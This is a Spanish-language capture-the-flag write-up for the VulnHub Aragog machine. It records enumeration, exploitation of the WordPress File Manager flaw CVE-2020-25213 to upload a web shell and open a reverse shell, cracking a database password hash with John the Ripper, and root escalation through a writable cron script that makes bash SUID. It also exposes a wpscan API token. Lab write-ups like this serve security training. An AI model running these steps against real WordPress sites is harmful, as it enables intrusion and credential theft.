-----------
- Tags:  #writeup #info #vulnhub #tutorial #wordpress #github 
----------

Encontramos Puertos [[SSH - 22]] y *80* abiertos

Con el script *http-enum* encontramos un [[WordPress]]  version 5.0.12
```bash
80/tcp open  http
   8 │ | http-enum: 
   9   │ |   /blog/: Blog
  10   │ |_  /blog/wp-login.php: Wordpress login page.
```

- En la ruta */blog* se esta aplicando *Virtual Hosting* por lo cual es necesario implementar la ruta en el archivo */etc/hosts*

con [[Wpscan]] y usando el token de la api:
```bash
wpscan --url http://192.168.3.160/blog/ -e u vp --api-token JCC8LTpALyVB9OA0wb3HyrnKdCXSZ9CaysMsZ7sxYHI
```

encontramos una vulnearbilidad en el plugin *File manager*

Vulnerable a *Wp-File-Manager CVE-2020-25213*

- Ejecutamos este script y le pasamos como paramaetro *nuestro* script de la *web Shell*
```bash
./CVE-2020-25213.sh -u http://192.168.3.160/blog --upload_file /home/luisillo/Desktop/Machines/Aragog/exploits/NuestraShell.php
```

- Mediante parametro *cmd* creamos la reverse shell y pa dentro

-----------------------------

# Privesc

- Como sabemos que estamos ante un [[WordPress]], buscamos con el comando *find* algun archivo de configuracion:
```bash
find / -name config*.php 2>/dev/null
```

- Nos toparemos con el archivo */etc/wordpress/config-default.php*, el cual contiene las creds de la *BD MySQL* en formato de *hash*

## Con ayuda de John The Ripper:
- creamos el archivo *hash* con la credencial obtenida y se la pasamos como parametro a john
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
//
john --show hash
```

- De esta forma crackeamos la contraseña

- Una vez logueados por [[SSH]] con el user *hagrid98*, si filtramos por archivos *.sh* con el uso de *find*, vemos el archivo */opt/.backup.sh*, propietario *root* y tenemos permisos de *escritura*

- Aqui podemos hacer uso de alguna herramienta como [[Pspy]] para ver si  este script se esta ejecutando en 2do plano en el sistema (lo cual es correcto)

- Simplemente modificamos el archivo del archivo para cambiar el permiso de la *bash* a *SUID* y listo :)

- [CVE-2020-25213 Github](https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213/blob/main/wp-file-manager-exploit.sh)